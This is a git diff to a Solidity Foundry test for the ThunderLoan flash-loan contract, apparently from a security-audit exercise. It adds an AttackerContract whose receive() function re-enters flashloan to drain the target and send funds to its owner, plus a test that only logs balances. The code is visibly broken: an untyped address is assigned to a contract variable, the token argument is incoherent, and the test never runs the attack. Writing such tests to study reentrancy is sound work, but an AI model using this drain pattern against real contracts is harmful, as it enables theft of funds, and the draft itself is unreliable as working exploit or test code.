@@ -12,11 +12,13 @@ contract ThunderLoanTest is BaseTest {
     address liquidityProvider = address(123);
     address user = address(456);
     MockFlashLoanReceiver mockFlashLoanReceiver;
+    AttackerContract attackerContract;
 
     function setUp() public override {
         super.setUp();
         vm.prank(user);
         mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
+        attackerContract=new AttackerContract(address(thunderLoan));
     }
 
     function testInitializationOwner() public {
@@ -86,5 +88,34 @@ contract ThunderLoanTest is BaseTest {
 
         assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
         assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
+    }
+
+    function testReentrancyAttack() public{
+        uint256 amountBorrow=AMOUNT*10;
+
+        console.log("Intial Attacker Balance : ", tokenA.balanceOf(address(attackerContract)));
+        console.log("Intial ThunderLoan Balance : ", tokenA.balanceOf(address(thunderLoan)));
+    }
+}
+
+contract AttackerContract {
+    ThunderLoan public target;
+    address public owner;
+
+    constructor(address _flashLoanAddress){
+        target=_flashLoanAddress;
+        owner=msg.sender;
+    }
+
+    function attacker(ERC20Mock token , uint256 amount) public{
+        target.flashloan(address(this),ERC20Mock(token),amount,abi.encode(owner));
+    }
+
+    receive() external payable{
+        if(address(target).balance > 0){
+        target.flashloan(address(this),ERC20Mock(address(target)),address(target).balance,"");
+        }
+
+        payable(owner).transfer(address(this).balance);
     }
 }
